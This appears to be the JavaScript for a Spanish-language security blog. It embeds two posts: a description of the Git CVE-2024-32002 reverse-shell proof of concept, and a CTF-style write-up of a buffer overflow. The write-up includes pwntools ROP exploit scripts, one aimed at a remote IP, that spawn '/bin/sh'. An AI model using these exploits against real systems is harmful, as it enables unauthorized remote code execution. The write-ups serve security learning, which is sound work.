document.addEventListener('DOMContentLoaded', function () {
    const posts = [
        {
            id: 1,
            title: 'CVE 2024-32002',
            date: 'June 12, 2024',
            content: `
                <h2>CVE-2024-32002-Reverse-Shell</h2>
                <p>Este script demuestra cómo explotar la vulnerabilidad CVE-2024-32002 para obtener una reverse shell, proporcionando acceso remoto al sistema afectado. Úselo con precaución en entornos controlados y solo con fines educativos o de pruebas de seguridad.</p>
                <h3>Publicación del Blog</h3>
                <p>Este script esta inspirado en el blog Blog: <a href="https://amalmurali.me/posts/git-rce">https://amalmurali.me/posts/git-rce</a>. aca encontraras más detalles acerca de esta vulnerabilidad</p>
                <h3>Cómo funciona</h3>
                <ol>
                    <li>Un repositorio malicioso (<code>git_rce</code>) incluye un submódulo con una ruta especialmente diseñada.</li>
                    <li>La ruta del submódulo utiliza una variación de mayúsculas y minúsculas que explota el sistema de archivos que no distingue entre mayúsculas y minúsculas.</li>
                    <li>El submódulo incluye un enlace simbólico que apunta a su directorio <code>.git/</code>, que contiene un enlace malicioso.</li>
                    <li>Cuando se clona el repositorio, se sigue el enlace simbólico y se ejecuta el enlace malicioso, lo que lleva a RCE.</li>
                </ol>
                <h3>Versiones de Git Afectadas y Parcheadas</h3>
                <p>Versiones afectadas por la vulnerabilidad:</p>
                <ul>
                    <li>Todas las versiones anteriores a 2.45.1</li>
                    <li>Todas las versiones anteriores a 2.44.1</li>
                    <li>Todas las versiones anteriores a 2.43.4</li>
                    <li>Todas las versiones anteriores a 2.42.2</li>
                    <li>Todas las versiones anteriores a 2.41.1</li>
                    <li>Todas las versiones anteriores a 2.40.2</li>
                    <li>Todas las versiones anteriores a 2.39.4</li>
                </ul>
                <p>Versiones parcheadas:</p>
                <ul>
                    <li>2.45.1</li>
                    <li>2.44.1</li>
                    <li>2.43.4</li>
                    <li>2.42.2</li>
                    <li>2.41.1</li>
                    <li>2.40.2</li>
                    <li>2.39.4</li>
                </ul>
                <h3>Ejecución</h3>
                <p><strong>Advertencia:</strong> No ejecute esta PoC en sistemas que no sean de su propiedad o que no tenga permiso explícito para usarlo. Las pruebas no autorizadas podrían tener consecuencias no deseadas.</p>
                <div class="code-block">
                    <pre><code>bash pocgitrevershell.sh</code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
                <p>Nota: En Windows, es posible que necesites ejecutar el shell como administrador para que esto funcione.</p>
                <h3>Como se ve al ejecutar</h3>
                <img src="https://github.com/JJoosh/CVE-2024-32002-Reverse-Shell/assets/122099216/1f48060d-04dd-4331-8ecd-7e15e57735b6" alt="Execution Screenshot">
                <img src="https://github.com/JJoosh/CVE-2024-32002-Reverse-Shell/assets/122099216/98ee1c05-a191-406c-9c35-b6ef2b474d90" alt="Execution Screenshot">
                <p>Es todo por este PoC, sigueme en github :) <a href="https://github.com/JJoosh">Follow me</a></p>

            `
        },

        {
            id: 2, 
            title: 'C2 Server Exploit',
            date: 'October 14, 2024',
            content: `
                <h2>Server C2 Exploit Writeup</h2>

                <p><strong>1. Comando principal:</strong></p>
                <p>El análisis del servidor comenzó obteniendo el binario responsable de ejecutar el servidor C2. Este binario fue descompilado utilizando <code>Ghidra</code>...</p>

                <p><strong>2. Análisis inicial:</strong></p>
                <p>El primer paso fue identificar que el binario ejecutaba un bucle en el que esperaba comandos del cliente...</p>

                <p><strong>3. Función main()</strong></p>
                <p>La función <code>main()</code> del binario ejecuta un bucle n veces según la longitud de la string <code>"echo Datos exfiltrados"</code>...</p>

                <p><strong>4. Función updateCommand()</strong></p>
                <p>La función <code>updateCommand()</code> se encarga de mover el puntero del buffer...</p>
                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295430734458257509/image.png" alt="Command Execution Diagram" />

                <p><strong>5. Explotación de vulnerabilidad</strong></p>
                <p>El problema identificado se encuentra en cómo se manejan los punteros en el buffer de comandos...</p>
                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295431235232993352/image.png" alt="Execution Screenshot" />

                <p><strong>6. Vulnerabilidad del Buffer</strong></p>
                <p>Luego tenemos que la función <code>vuln()</code> declara un buffer y recibe con <code>fgets</code> 0x200 bytes...</p>
                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295432051033509908/image.png" alt="Buffer Overflow" />

                <p><strong>7. Ejecución Remota</strong></p>
                <p>Finalmente, <code>main()</code> llama a la función <code>execCommand()</code>...</p>

                <h3>Exploitation Script</h3>
                <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import *

shell = gdb.debug("./chal", "continue")

offset = 268
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x42424242)

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>

                <h3>Final Exploit Execution</h3>
                <p>Una vez completado, modificamos la string del simbolo <code>command</code> a <code>/bin/sh</code>...</p>
                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295497878894149642/image.png" alt="Shell Execution" />

                <p>Finalmente ejecutamos el siguiente script de manera remota:</p>
                <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import remote, p32, u8

shell = remote("35.95.31.64", 3000)

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\\x00"

payload  = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x080491f3)     # updateCommand()
    payload += p32(0x0804901b)     # add esp, 8; pop ebx; ret;
    payload += p32(i)              # position
    payload += p32(u8(cmd[i:i+1])) # byte to write
    payload += p32(0x41414141)

payload += p32(0x0804921d)         # execCommand()

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
            `
        }
    ];

    document.querySelectorAll('.read-more').forEach(button => {
        button.addEventListener('click', function(event) {
            event.preventDefault();
            const postId = this.parentElement.getAttribute('data-id');
            const post = posts.find(p => p.id == postId);

            document.querySelector('.blog-posts').style.display = 'none';
            document.getElementById('full-post').style.display = 'block';
            document.getElementById('post-content').innerHTML = `
                <h2>${post.title}</h2>
                <p class="date">${post.date}</p>
                ${post.content}
            `;
        });
    });

    document.getElementById('back-to-blog').addEventListener('click', function(event) {
        event.preventDefault();
        document.querySelector('.blog-posts').style.display = 'block';
        document.getElementById('full-post').style.display = 'none';
        document.getElementById('post-content').innerHTML = '';
    });
});

function toggleMenu() {
    const navLinks = document.getElementById('nav-links');
    navLinks.classList.toggle('active');
}

function copyCode(button) {
    const codeBlock = button.previousElementSibling;
    const range = document.createRange();
    range.selectNode(codeBlock);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);

    try {
        const successful = document.execCommand('copy');
        if (successful) {
            button.innerHTML = '<i class="fas fa-check"></i>';
            setTimeout(() => {
                button.innerHTML = '<i class="fas fa-copy"></i>';
            }, 2000);
        }
    } catch (err) {
        console.error('Failed to copy text: ', err);
    }

    window.getSelection().removeAllRanges();
}
